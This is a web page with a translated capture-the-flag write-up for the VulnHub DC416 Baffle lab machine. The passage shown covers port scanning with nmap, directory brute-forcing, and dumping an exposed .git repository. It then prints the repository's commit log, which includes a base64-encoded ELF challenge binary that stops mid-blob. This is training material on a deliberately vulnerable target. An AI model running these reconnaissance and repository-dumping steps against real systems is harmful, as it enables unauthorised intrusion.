<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>VulnHub: Reverse everything you can in DC416 Baffle</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good day to all, this article would like to complete the DC416, CTF series from DefCon Toronto's conference. Leaving DC416 Baffle for dessert, in my o...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>VulnHub: Reverse everything you can in DC416 Baffle</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/3d6/802/fd6/3d6802fd6650426ca147ee3fea98180b.png"><br><br>  Good day to all, this article would like to complete the DC416, CTF series from <a href="https://dc416.com/">DefCon Toronto's</a> conference.  Leaving <a href="https://www.vulnhub.com/entry/dc416-2016,168/">DC416 Baffle</a> for dessert, in my opinion, is the most interesting and hardcore quest provided by the <a href="https://www.vulnhub.com/">VulnHub</a> team. <br><br>  <b>Attention!</b>  <b>Ahead will be a lot of reverse and binary operation!</b> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      If you are not ready for this, then I recommend to get acquainted first with the previous raytaps: <br><br><ul><li>  <a href="https://habrahabr.ru/post/318372/">DC416 Dick Dastardly</a> </li><li>  <a href="https://habrahabr.ru/post/318998/">DC416 Basement</a> </li><li>  <a href="https://habrahabr.ru/post/319204/">DC416 Fortress</a> </li></ul><br><a name="habracut"></a><br><h3>  Let's start </h3><br>  We start virtualka, and proceed to search for open ports: <br><br><pre><code class="bash hljs">$ sudo arp-scan -l -I wlan0 | grep <span class="hljs-string"><span class="hljs-string">"CADMUS COMPUTER SYSTEMS"</span></span> | awk <span class="hljs-string"><span class="hljs-string">'{print $1}'</span></span> | xargs sudo nmap -sV -p1-65535</code> </pre> <br><blockquote>  Starting Nmap 7.01 ( <a href="https://nmap.org/">nmap.org</a> ) at 2016-12-31 12:19 MSK <br>  Nmap scan report for 192.168.1.190 <br>  Host is up (0.00071s latency). <br>  Not shown: 65532 closed ports <br>  PORT STATE SERVICE VERSION <br>  22 / tcp open ssh OpenSSH 6.7p1 Debian 5 + deb8u3 (protocol 2.0) <br>  80 / tcp open http nginx 1.6.2 <br>  6969 / tcp open acmsoda? <br>  MAC Address: 08: 00: 27: 84: 83: C3 (Oracle VirtualBox virtual NIC) <br>  Service Info: OS: Linux;  CPE: cpe: / o: linux: linux_kernel </blockquote><br><h3>  Flag 1 </h3><br><pre> <code class="bash hljs">$ sudo dirsearch -u <span class="hljs-string"><span class="hljs-string">'http://192.168.1.190'</span></span> -w /usr/share/dirb/wordlists/big.txt -e php,html,js,jpg,txt,bak -r -f -x 403</code> </pre> <br><img src="https://habrastorage.org/files/5af/652/31b/5af65231bdbe4dce9a0882beb73ff345.png"><br><br>  There is a directory with git repository.  We download it using <a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a> : <br><br><pre> <code class="bash hljs">$ mkdir site-repo &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> site-repo $ rip-git -u http://192.168.1.190/.git/ $ ls -ahl drwxrwxr-x 6 gh0st3rs gh0st3rs 4,0K . 2 17:25 .git -rw-rw-r-- 1 gh0st3rs gh0st3rs 616 . 2 17:25 hellofriend.c</code> </pre> <br><div class="spoiler">  <b class="spoiler_title">Commit log</b> <div class="spoiler_text"><pre> <code class="markdown hljs">commit 8bde72465957415c12ab6f89ff679f8f9e7c5c7a Author: alice <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">alice@baffle.me</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span> Date: Mon Oct 17 14:58:02 2016 -0400 Trashed my code, but deployed the product anyway. diff --git a/hellofriend.cb/hellofriend.c index 10a4d9e..6f8855b 100644 --- a/hellofriend.c +++ b/hellofriend.c @@ -13,22 +13,13 @@ int parse<span class="hljs-emphasis"><span class="hljs-emphasis">_request(char *req, int n) { char mode[10]; char *ptr = req; FILE *fp; - - memset(file, 0, sizeof(file)); - memset(mode, 0, sizeof(mode)); - - memset(data, 0, sizeof(data)); - memset(to_</span></span>write, 0, sizeof(to<span class="hljs-emphasis"><span class="hljs-emphasis">_write)); - - ptr = (char *)ptr + 2; - file_</span></span>len = strlen(ptr); - - ptr = (char <span class="hljs-emphasis"><span class="hljs-emphasis">*)ptr + file_len + 1; - ptr = (char *</span></span>)ptr + 6; - - memcpy(to<span class="hljs-emphasis"><span class="hljs-emphasis">_write, ptr, 500); - memcpy(data, ptr, 2000); + if (req_</span></span>type == 0x01) { + /<span class="hljs-bullet"><span class="hljs-bullet">* todo *</span></span>/ + } + if (req<span class="hljs-emphasis"><span class="hljs-emphasis">_type == 0x2) { + /* todo */ + } return 0; } diff --git a/project.enc b/project.enc deleted file mode 100644 index 7fe355b..0000000 --- a/project.enc +++ /dev/null @@ -1,147 +0,0 @@ -f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAUAZAAAAAAABAAAAAAAAAAPgYAAAAAAAAAAAAAEAAOAAI -AEAAHwAcAAYAAAAFAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAAwAEAAAAAAADAAQAAAAAAAAgA -AAAAAAAAAwAAAAQAAAAAAgAAAAAAAAACQAAAAAAAAAJAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA -AAAAAAABAAAABQAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAFwLAAAAAAAAXAsAAAAAAAAAACAA -AAAAAAEAAAAGAAAAYAsAAAAAAABgC2AAAAAAAGALYAAAAAAAYAIAAAAAAAB4BAAAAAAAAAAAIAAA -AAAAAgAAAAYAAAB4CwAAAAAAAHgLYAAAAAAAeAtgAAAAAADQAQAAAAAAANABAAAAAAAACAAAAAAA -AAAEAAAABAAAABwCAAAAAAAAHAJAAAAAAAAcAkAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA -AFDldGQEAAAADAoAAAAAAAAMCkAAAAAAAAwKQAAAAAAAPAAAAAAAAAA8AAAAAAAAAAQAAAAAAAAA -UeV0ZAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAv -bGliNjQvbGQtbGludXgteDg2LTY0LnNvLjIABAAAABAAAAABAAAAR05VAAAAAAACAAAABgAAACAA -AAAEAAAAFAAAAAMAAABHTlUAjY+HU1RRADsF2xXRTQeBhXaBO0kCAAAACwAAAAEAAAAGAAAAAAAA -AAABEAALAAAAAAAAACkdjBwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgAAABIAAAAAAAAA -AAAAAAAAAAAAAAAAPwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAEQAAABIAAAAAAAAAAAAAAAAAAAAA -AAAAJQAAABIAAAAAAAAAAAAAAAAAAAAAAAAALAAAABIAAAAAAAAAAAAAAAAAAAAAAAAARgAAABIA -AAAAAAAAAAAAAAAAAAAAAAAAGAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAWAAAACAAAAAAAAAAAAAA -AAAAAAAAAAAAOAAAABIAAAAAAAAAAAAAAAAAAAAAAAAACwAAABIAAAAAAAAAAAAAAAAAAAAAAAAA -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 -AAAAAAAAAAAAAAAAAwAEAGACQAAAAAAAAAAAAAAAAAAAAAAAAwAFAIgCQAAAAAAAAAAAAAAAAAAA -AAAAAwAGAKgDQAAAAAAAAAAAAAAAAAAAAAAAAwAHACYEQAAAAAAAAAAAAAAAAAAAAAAAAwAIAEAE -QAAAAAAAAAAAAAAAAAAAAAAAAwAJAHAEQAAAAAAAAAAAAAAAAAAAAAAAAwAKAKAEQAAAAAAAAAAA -AAAAAAAAAAAAAwALAHgFQAAAAAAAAAAAAAAAAAAAAAAAAwAMAKAFQAAAAAAAAAAAAAAAAAAAAAAA -AwANAEAGQAAAAAAAAAAAAAAAAAAAAAAAAwAOAFAGQAAAAAAAAAAAAAAAAAAAAAAAAwAPAPQJQAAA -AAAAAAAAAAAAAAAAAAAAAwAQAAAKQAAAAAAAAAAAAAAAAAAAAAAAAwARAAwKQAAAAAAAAAAAAAAA -AAAAAAAAAwASAEgKQAAAAAAAAAAAAAAAAAAAAAAAAwATAGALYAAAAAAAAAAAAAAAAAAAAAAAAwAU -AGgLYAAAAAAAAAAAAAAAAAAAAAAAAwAVAHALYAAAAAAAAAAAAAAAAAAAAAAAAwAWAHgLYAAAAAAA -AAAAAAAAAAAAAAAAAwAXAEgNYAAAAAAAAAAAAAAAAAAAAAAAAwAYAFANYAAAAAAAAAAAAAAAAAAA -AAAAAwAZALANYAAAAAAAAAAAAAAAAAAAAAAAAwAaAMANYAAAAAAAAAAAAAAAAAAAAAAAAwAbAAAA -AAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAQAVAHALYAAAAAAAAAAA -AAAAAAAZAAAAAgAOAIAGQAAAAAAAAAAAAAAAAAAbAAAAAgAOAMAGQAAAAAAAAAAAAAAAAAAuAAAA -AgAOAAAHQAAAAAAAAAAAAAAAAABEAAAAAQAaAMgNYAAAAAAAAQAAAAAAAABTAAAAAQAUAGgLYAAA -AAAAAAAAAAAAAAB6AAAAAgAOACAHQAAAAAAAAAAAAAAAAACGAAAAAQATAGALYAAAAAAAAAAAAAAA -AAClAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACtAAAAAQAS -AFgLQAAAAAAAAAAAAAAAAAC7AAAAAQAVAHALYAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAA -AAAAAAAAAADHAAAAAAATAGgLYAAAAAAAAAAAAAAAAADYAAAAAQAWAHgLYAAAAAAAAAAAAAAAAADh -AAAAAAATAGALYAAAAAAAAAAAAAAAAAD0AAAAAAARAAwKQAAAAAAAAAAAAAAAAAAHAQAAAQAYAFAN -YAAAAAAAAAAAAAAAAAAdAQAAEgAOAPAJQAAAAAAAAgAAAAAAAAAtAQAAIAAAAAAAAAAAAAAAAAAA -AAAAAABJAQAAEQAaAMANYAAAAAAACAAAAAAAAAD6AQAAIAAZALANYAAAAAAAAAAAAAAAAABdAQAA -EAAZAMANYAAAAAAAAAAAAAAAAAAnAQAAEgAPAPQJQAAAAAAAAAAAAAAAAABkAQAAEgAAAAAAAAAA -AAAAAAAAAAAAAAB4AQAAEgAAAAAAAAAAAAAAAAAAAAAAAACMAQAAEgAAAAAAAAAAAAAAAAAAAAAA -AACgAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAC0AQAAEgAAAAAAAAAAAAAAAAAAAAAAAADGAQAAEgAA -AAAAAAAAAAAAAAAAAAAAAADlAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAD4AQAAEAAZALANYAAAAAAA -AAAAAAAAAAAFAgAAIAAAAAAAAAAAAAAAAAAAAAAAAAAUAgAAEQIZALgNYAAAAAAAAAAAAAAAAAAh -AgAAEgAAAAAAAAAAAAAAAAAAAAAAAAA0AgAAEQAQAAAKQAAAAAAABAAAAAAAAABDAgAAEgAOAIAJ -QAAAAAAAZQAAAAAAAADTAAAAEAAaANgPYAAAAAAAAAAAAAAAAAD+AQAAEgAOAFAGQAAAAAAAKgAA -AAAAAABTAgAAEAAaAMANYAAAAAAAAAAAAAAAAABfAgAAEgAOAPcIQAAAAAAAfAAAAAAAAABkAgAA -EgAAAAAAAAAAAAAAAAAAAAAAAAB3AgAAIAAAAAAAAAAAAAAAAAAAAAAAAACLAgAAEgAOAEYHQAAA -AAAAsQEAAAAAAACZAgAAEQIZAMANYAAAAAAAAAAAAAAAAAClAgAAIAAAAAAAAAAAAAAAAAAAAAAA -AAC/AgAAEQAaAOANYAAAAAAA9AEAAAAAAABNAgAAEgALAHgFQAAAAAAAAAAAAAAAAAAAY3J0c3R1 -ZmYuYwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNf -YXV4AGNvbXBsZXRlZC42OTc5AF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5 -AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBjdGZ0cC5jAF9fRlJB -TUVfRU5EX18AX19KQ1JfRU5EX18AX19pbml0X2FycmF5X2VuZABfRFlOQU1JQwBfX2luaXRfYXJy -YXlfc3RhcnQAX19HTlVfRUhfRlJBTUVfSERSAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfX2xpYmNf -Y3N1X2ZpbmkAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAHN0ZG91dEBAR0xJQkNfMi4yLjUA -X2VkYXRhAHN0cmxlbkBAR0xJQkNfMi4yLjUAc2V0YnVmQEBHTElCQ18yLjIuNQBwcmludGZAQEdM -SUJDXzIuMi41AG1lbXNldEBAR0xJQkNfMi4yLjUAcmVhZEBAR0xJQkNfMi4yLjUAX19saWJjX3N0 -YXJ0X21haW5AQEdMSUJDXzIuMi41AGZnZXRzQEBHTElCQ18yLjIuNQBfX2RhdGFfc3RhcnQAX19n -bW9uX3N0YXJ0X18AX19kc29faGFuZGxlAG1lbWNweUBAR0xJQkNfMi4xNABfSU9fc3RkaW5fdXNl -ZABfX2xpYmNfY3N1X2luaXQAX19ic3Nfc3RhcnQAbWFpbgBmb3BlbkBAR0xJQkNfMi4yLjUAX0p2 -X1JlZ2lzdGVyQ2xhc3NlcwBwYXJzZV9yZXF1ZXN0AF9fVE1DX0VORF9fAF9JVE1fcmVnaXN0ZXJU -TUNsb25lVGFibGUAdG9fd3JpdGUAAC5zeW10YWIALnN0cnRhYgAuc2hzdHJ0YWIALmludGVycAAu -bm90ZS5BQkktdGFnAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3Ry -AC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5w -bHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRf -YXJyYXkALmZpbmlfYXJyYXkALmpjcgAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21t -ZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -AAAAAAAAAAAAAAAAAAAAGwAAAAEAAAACAAAAAAAAAAACQAAAAAAAAAIAAAAAAAAcAAAAAAAAAAAA -AAAAAAAAAQAAAAAAAAAAAAAAAAAAACMAAAAHAAAAAgAAAAAAAAAcAkAAAAAAABwCAAAAAAAAIAAA -AAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAxAAAABwAAAAIAAAAAAAAAPAJAAAAAAAA8AgAA -AAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAPb//28CAAAAAAAAAGACQAAA -AAAAYAIAAAAAAAAkAAAAAAAAAAUAAAAAAAAACAAAAAAAAAAAAAAAAAAAAE4AAAALAAAAAgAAAAAA -AACIAkAAAAAAAIgCAAAAAAAAIAEAAAAAAAAGAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABWAAAAAwAA -AAIAAAAAAAAAqANAAAAAAACoAwAAAAAAAH4AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA -XgAAAP///28CAAAAAAAAACYEQAAAAAAAJgQAAAAAAAAYAAAAAAAAAAUAAAAAAAAAAgAAAAAAAAAC -AAAAAAAAAGsAAAD+//9vAgAAAAAAAABABEAAAAAAAEAEAAAAAAAAMAAAAAAAAAAGAAAAAQAAAAgA -AAAAAAAAAAAAAAAAAAB6AAAABAAAAAIAAAAAAAAAcARAAAAAAABwBAAAAAAAADAAAAAAAAAABQAA -AAAAAAAIAAAAAAAAABgAAAAAAAAAhAAAAAQAAABCAAAAAAAAAKAEQAAAAAAAoAQAAAAAAADYAAAA -AAAAAAUAAAAYAAAACAAAAAAAAAAYAAAAAAAAAI4AAAABAAAABgAAAAAAAAB4BUAAAAAAAHgFAAAA -AAAAGgAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACJAAAAAQAAAAYAAAAAAAAAoAVAAAAA -AACgBQAAAAAAAKAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAlAAAAAEAAAAGAAAAAAAA -AEAGQAAAAAAAQAYAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAJ0AAAABAAAA -BgAAAAAAAABQBkAAAAAAAFAGAAAAAAAAogMAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAACj -AAAAAQAAAAYAAAAAAAAA9AlAAAAAAAD0CQAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAA -AAAAAAAAqQAAAAEAAAACAAAAAAAAAAAKQAAAAAAAAAoAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAA -AAAAAAAAAAAAAAAAALEAAAABAAAAAgAAAAAAAAAMCkAAAAAAAAwKAAAAAAAAPAAAAAAAAAAAAAAA -AAAAAAQAAAAAAAAAAAAAAAAAAAC/AAAAAQAAAAIAAAAAAAAASApAAAAAAABICgAAAAAAABQBAAAA -AAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAyQAAAA4AAAADAAAAAAAAAGALYAAAAAAAYAsAAAAA -AAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAANUAAAAPAAAAAwAAAAAAAABoC2AAAAAA -AGgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADhAAAAAQAAAAMAAAAAAAAA -cAtgAAAAAABwCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA5gAAAAYAAAAD -AAAAAAAAAHgLYAAAAAAAeAsAAAAAAADQAQAAAAAAAAYAAAAAAAAACAAAAAAAAAAQAAAAAAAAAJgA -AAABAAAAAwAAAAAAAABIDWAAAAAAAEgNAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAA -AAAAAADvAAAAAQAAAAMAAAAAAAAAUA1gAAAAAABQDQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA -AAAAAAgAAAAAAAAA+AAAAAEAAAADAAAAAAAAALANYAAAAAAAsA0AAAAAAAAQAAAAAAAAAAAAAAAA -AAAACAAAAAAAAAAAAAAAAAAAAP4AAAAIAAAAAwAAAAAAAADADWAAAAAAAMANAAAAAAAAGAIAAAAA -AAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAADAQAAAQAAADAAAAAAAAAAAAAAAAAAAADADQAAAAAA -ACYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA -6BcAAAAAAAAMAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAA -AAAAAAAAAOgNAAAAAAAAOAcAAAAAAAAeAAAALwAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAA -AAAAAAAAAAAAAAAAAAAgFQAAAAAAAMgCAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca Author: alice &lt;alice@baffle.me&gt; Date: Mon Oct 17 14:55:07 2016 -0400 Some assembly required diff --git a/project.enc b/project.enc new file mode 100644 index 0000000..7fe355b --- /dev/null +++ b/project.enc @@ -0,0 +1,147 @@ +f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAUAZAAAAAAABAAAAAAAAAAPgYAAAAAAAAAAAAAEAAOAAI +AEAAHwAcAAYAAAAFAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAAwAEAAAAAAADAAQAAAAAAAAgA +AAAAAAAAAwAAAAQAAAAAAgAAAAAAAAACQAAAAAAAAAJAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA +AAAAAAABAAAABQAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAFwLAAAAAAAAXAsAAAAAAAAAACAA +AAAAAAEAAAAGAAAAYAsAAAAAAABgC2AAAAAAAGALYAAAAAAAYAIAAAAAAAB4BAAAAAAAAAAAIAAA +AAAAAgAAAAYAAAB4CwAAAAAAAHgLYAAAAAAAeAtgAAAAAADQAQAAAAAAANABAAAAAAAACAAAAAAA +AAAEAAAABAAAABwCAAAAAAAAHAJAAAAAAAAcAkAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA 